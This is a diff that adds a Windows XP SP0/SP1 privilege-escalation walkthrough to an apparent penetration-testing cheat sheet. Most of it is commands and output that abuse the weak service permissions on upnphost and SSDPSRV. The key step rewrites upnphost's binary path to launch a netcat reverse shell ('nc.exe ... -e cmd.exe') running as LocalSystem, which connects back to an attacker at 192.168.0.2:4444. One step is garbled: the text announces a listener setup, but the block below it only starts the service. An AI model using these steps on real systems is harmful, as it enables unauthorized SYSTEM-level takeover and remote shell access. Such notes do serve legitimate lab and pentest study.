@@ -344,6 +344,182 @@ export SHELL=/bin/bash:$SHELL
 
 - [ ] Check priv using the whoami \all 
 
+### Windows XP SP0/SP1 PrivEscalation
+
+Let's check if we get access to two services from which we can edit the service parameters:
+```
+C:\> accesschk.exe /accepteula -uwcqv "Authenticated Users" *
+
+# If we are on a Windows XP SP0 or SP1 OS we will receive the following output
+								 
+RW SSDPSRV
+        SERVICE_ALL_ACCESS
+RW upnphost
+        SERVICE_ALL_ACCESS								 
+```
+
+Let's take a closer look at both services.
+```
+# SSDPSRV
+								 
+C:\> accesschk.exe /accepteula -ucqv SSDPSRV
+SSDPSRV
+  RW NT AUTHORITY\SYSTEM
+        SERVICE_ALL_ACCESS
+  RW BUILTIN\Administrators
+        SERVICE_ALL_ACCESS
+  RW NT AUTHORITY\Authenticated Users
+        SERVICE_ALL_ACCESS
+  RW BUILTIN\Power Users
+        SERVICE_ALL_ACCESS
+  RW NT AUTHORITY\LOCAL SERVICE
+        SERVICE_ALL_ACCESS
+								 
+# upnphost
+
+C:\> accesschk.exe /accepteula -ucqv upnphost
+upnphost
+  RW NT AUTHORITY\SYSTEM
+        SERVICE_ALL_ACCESS
+  RW BUILTIN\Administrators
+        SERVICE_ALL_ACCESS
+  RW NT AUTHORITY\Authenticated Users
+        SERVICE_ALL_ACCESS
+  RW BUILTIN\Power Users
+        SERVICE_ALL_ACCESS
+  RW NT AUTHORITY\LOCAL SERVICE
+        SERVICE_ALL_ACCESS								 
+```
+
+Lets check the details of those services
+
+```
+C:\> sc qc upnphost
+[SC] GetServiceConfig SUCCESS
+
+SERVICE_NAME: upnphost
+        TYPE               : 20  WIN32_SHARE_PROCESS
+        START_TYPE         : 3   DEMAND_START
+        ERROR_CONTROL      : 1   NORMAL
+        BINARY_PATH_NAME   : C:\WINDOWS\System32\svchost.exe -k LocalService
+        LOAD_ORDER_GROUP   :
+        TAG                : 0
+        DISPLAY_NAME       : Universal Plug and Play Device Host
+	DEPENDENCIES       : SSDPSRV
+        SERVICE_START_NAME : NT AUTHORITY\LocalService		
+								 
+# SSDPSRV
+								 
+C:\> sc qc SSDPSRV
+[SC] GetServiceConfig SUCCESS
+
+SERVICE_NAME: SSDPSRV
+        TYPE               : 20  WIN32_SHARE_PROCESS 
+	START_TYPE         : 4   DISABLED
+        ERROR_CONTROL      : 1   NORMAL
+        BINARY_PATH_NAME   : C:\WINDOWS\System32\svchost.exe -k LocalService  
+        LOAD_ORDER_GROUP   :   
+        TAG                : 0  
+        DISPLAY_NAME       : SSDP Discovery Service   
+        DEPENDENCIES       :   
+        SERVICE_START_NAME : NT AUTHORITY\LocalService
+```
+
+upnphost is the service we are going to use to escalate our privileges. As you can see upnphost has a dependency, it requires SSDPSRV to run aswel. If we take a look at the current status of SSDPSRV with the command sc query SSDPSRV we can see that the service is currently STOPPED. If we try to start this service, we will get an error, as shown below.
+```
+# Query status
+								
+C:\> sc query SSDPSRV
+
+SERVICE_NAME: SSDPSRV
+        TYPE               : 20  WIN32_SHARE_PROCESS 
+        STATE              : 1  STOPPED 
+                                (NOT_STOPPABLE,NOT_PAUSABLE,IGNORES_SHUTDOWN)
+        WIN32_EXIT_CODE    : 1077       (0x435)
+        SERVICE_EXIT_CODE  : 0  (0x0)
+        CHECKPOINT         : 0x0
+        WAIT_HINT          : 0x0
+								
+# Attempt to start the service								
+								
+C:\> net start SSDPSRV
+System error 1058 has occurred.
+
+The service cannot be started, either because it is disabled or because it has no enabled devices associated with it.								
+```
+
+In order to fix this, we will need to set the SSDPSRV from DISABLED to AUTOMATIC. Once the service is set to AUTOMATIC we will be able to start it. We can do this with the following commands.
+
+```
+# Set SSDPSRV to AUTOMATIC
+# NOTE: There is a space between = and auto. This is important, else the command will fail.								
+								
+C:\> sc config SSDPSRV start= auto
+[SC] ChangeServiceConfig SUCCESS
+								
+# Double check if it's set to AUTOMATIC (or AUTO_START)
+								
+C:\> sc qc SSDPSRV
+[SC] GetServiceConfig SUCCESS
+
+SERVICE_NAME: SSDPSRV
+        TYPE               : 20  WIN32_SHARE_PROCESS 
+        START_TYPE         : 2   AUTO_START
+        ERROR_CONTROL      : 1   NORMAL
+        BINARY_PATH_NAME   : C:\WINDOWS\System32\svchost.exe -k LocalService  
+        LOAD_ORDER_GROUP   :   
+        TAG                : 0  
+        DISPLAY_NAME       : SSDP Discovery Service   
+        DEPENDENCIES       :   
+        SERVICE_START_NAME : NT AUTHORITY\LocalService							
+							
+
+SSDPSRV is successfully set to AUTOMATIC (AUTO_START)! Now let's try to start SSDPSRV again.
+
+C:\> net start SSDPSRV
+The SSDP Discovery Service service is starting.
+The SSDP Discovery Service service was started successfully.
+```
+
+Execute the commands below to edit the path of the binary that the upnphost service will execute when it's started.
+```
+# Set new binary path (don't forget the space after binpath=)							
+# Syntax
+								
+C:\> sc config upnphost binpath= "C:\nc.exe -nv [ip] [port] -e C:\WINDOWS\System32\cmd.exe"
+
+# Example
+C:\> sc config upnphost binpath= "C:\nc.exe -nv 192.168.0.2 4444 -e C:\WINDOWS\System32\cmd.exe"								
+[SC] ChangeServiceConfig SUCCESS
+								
+# Set obj and password
+C:\> sc config upnphost obj= ".\LocalSystem" password= ""
+[SC] ChangeServiceConfig SUCCESS							
+```
+
+Our upnphost service should now be ready to execute our nc.exe binary and connect back to a listener we will set up on our attacking machine. Let's do one last check of our upnphost service and make sure everything is as it should be.
+
+```
+C:\> sc qc upnphost
+[SC] GetServiceConfig SUCCESS
+                                                   
+SERVICE_NAME: upnphost                                                                                 
+        TYPE               : 20  WIN32_SHARE_PROCESS 
+        START_TYPE         : 3   DEMAND_START     
+        ERROR_CONTROL      : 1   NORMAL
+        BINARY_PATH_NAME   : C:\nc.exe -nv 192.168.0.2 4444 -e C:\WINDOWS\System32\cmd.exe   
+        LOAD_ORDER_GROUP   :   
+        TAG                : 0  
+        DISPLAY_NAME       : Universal Plug and Play Device Host  
+        DEPENDENCIES       : SSDPSRV  
+        SERVICE_START_NAME : NT AUTHORITY\LocalService							
+```
+
+Looks perfect! The next thing to do is set up a simple listener on our attacking machine. I prefer to use Netcat for this.
+```
+C:\> net start upnphost
+```
+
 ### JuicyPotato
 
 When you’ve found yourself as a low-level user on a Windows machine, it’s always worthwhile to check what privileges your user account has. If you have the SeImpersonatePrivilege, there is a very simply attack vector that you can leverage to gain SYSTEM level access.
